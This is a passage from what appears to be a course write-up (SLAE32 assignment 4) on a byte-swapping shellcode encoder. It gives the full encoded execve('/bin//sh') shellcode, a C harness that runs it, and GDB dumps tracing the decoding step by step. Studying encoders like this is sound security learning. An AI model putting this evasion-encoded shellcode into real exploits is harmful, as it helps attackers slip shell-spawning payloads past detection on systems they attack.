class="s2">69</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">7f"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Add our shellcode to our test C program and ensure it runs</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\xeb\x28\x5e\x31\xdb\x31\xc9\xf7\xe1\x89\xf7\xb1\x02\x80\x3c\x0e\x7f\x75\x15\x8a\x44\x0e\xfe\x8a\x5c\x0e\xff\x88\x1f\x88\x47\x01\x83\xc1\x03\x83\xc7\x02\xeb\xe5\xeb\x05\xe8\xd3\xff\xff\xff\xc0\x31\x7f\x68\x50\x7f\x2f\x2f\x7f\x68\x73\x7f\x2f\x68\x7f\x69\x62\x7f\x89\x6e\x7f\x50\xe3\x7f\xe2\x89\x7f\x89\x53\x7f\xb0\xe1\x7f\xcd\x0b\x7f\x7f\x80\x7f</span><span class="s">"</span><span class="p">;</span>

<span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
    <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>./shellcode
Shellcode Length: 86
sh-4.4<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="watching-the-stack-in-gdb">Watching the stack in GDB</h3>
<h4 id="after-esp-is-popped-into-esi-our-encoded-shellcode">After esp is popped into esi (our encoded shellcode)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>gdb$ x/40c $esi
0x40206f &lt;code+47&gt;:	0xc0	0x31	0x7f	0x68	0x50	0x7f	0x2f	0x2f
0x402077 &lt;code+55&gt;:	0x7f	0x68	0x73	0x7f	0x2f	0x68	0x7f	0x69
0x40207f &lt;code+63&gt;:	0x62	0x7f	0x89	0x6e	0x7f	0x50	0xe3	0x7f
0x402087 &lt;code+71&gt;:	0xe2	0x89	0x7f	0x89	0x53	0x7f	0xb0	0xe1
0x40208f &lt;code+79&gt;:	0x7f	0xcd	0xb	0x7f	0x7f	0x80	0x7f	0x0
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="after-first-swap">After first swap</h4>
<p>The first and second bytes (0xc0 and 0x31) have been swapped.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>gdb$ x/40c $esi
0x40206f &lt;code+47&gt;:	0x31	0xc0	0x7f	0x68	0x50	0x7f	0x2f	0x2f
0x402077 &lt;code+55&gt;:	0x7f	0x68	0x73	0x7f	0x2f	0x68	0x7f	0x69
0x40207f &lt;code+63&gt;:	0x62	0x7f	0x89	0x6e	0x7f	0x50	0xe3	0x7f
0x402087 &lt;code+71&gt;:	0xe2	0x89	0x7f	0x89	0x53	0x7f	0xb0	0xe1
0x40208f &lt;code+79&gt;:	0x7f	0xcd	0xb	0x7f	0x7f	0x80	0x7f	0x0
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="after-second-swap">After second swap</h4>
<p>The 4th and 5th bytes (0x68 and 0x50) have been swapped and placed into the 3rd and 4th byte position overwriting the 0x7f.  This process of swapping bytes and moving them back against the rest of the shellcode overwriting the 0x7f bytes will continue until the end.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>gdb$ x/40c $esi
0x40206f &lt;code+47&gt;:	0x31	0xc0	0x50	0x68	0x50	0x7f	0x2f	0x2f
0x402077 &lt;code+55&gt;:	0x7f	0x68	0x73	0x7f	0x2f	0x68	0x7f	0x69
0x40207f &lt;code+63&gt;:	0x62	0x7f	0x89	0x6e	0x7f	0x50	0xe3	0x7f
0x402087 &lt;code+71&gt;:	0xe2	0x89	0x7f	0x89	0x53	0x7f	0xb0	0xe1
0x40208f &lt;code+79&gt;:	0x7f	0xcd	0xb	0x7f	0x7f	0x80	0x7f	0x0
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="after-last-swap">After last swap</h4>
<p>The final bytes are now from 0x40206f to the first byte at 0x402087 (0x80).  The rest of the bytes after this are now junk and was the extra space the encoded shellcode was using up due to the 0x7f weâ€™ve been overwriting.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>gdb$ x/40c $esi
0x40206f &lt;code+47&gt;:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68
0x402077 &lt;code+55&gt;:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50
0x40207f &lt;code+63&gt;:	0x89	0xe2	0x53	0x89	0xe1	0xb0	0xb	0xcd
0x402087 &lt;code+71&gt;:	0x80	0x7f	0x7f	0x89	0x53	0x7f	0xb0	0xe1
0x40208f &lt;code+79&gt;:	0x7f	0xcd	0xb	0x7f	0x7f	0x80	0x7f	0x0
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="finally-we-jump-to-the-decoded-shellcode-to-execute-it">Finally we jump to the decoded shellcode to execute it.</h4>
<p>When you compare this to the original shellcode we started with to encode youâ€™ll see we have turned it back into the same.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre>=&gt; 0x0040206f &lt;+47&gt;:	xor    eax,eax
   0x00402071 &lt;+49&gt;:	push   eax
   0x00402072 &lt;+50&gt;:	push   0x68732f2f
   0x00402077 &lt;+55&gt;:	push   0x6e69622f
   0x0040207c &lt;+60&gt;:	mov    ebx,esp
   0x0040207e &lt;+62&gt;:	push   eax
   0x0040207f &lt;+63&gt;:	mov    edx,esp
   0x00402081 &lt;+65&gt;:	push   ebx
   0x00402082 &lt;+66&gt;:	mov    ecx,esp
   0x00402084 &lt;+68&gt;:	mov    al,0xb
   0x00402086 &lt;+70&gt;:	int    0x80
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="source-code">Source code</h3>
<p>All source code for this assignment can be found at<br />
 <a href="https://github.com/tdmathison/SLAE32/tree/master/assignment4">https://github.com/tdmathison/SLAE32/tree/master/assignment4</a>.</p>
:ET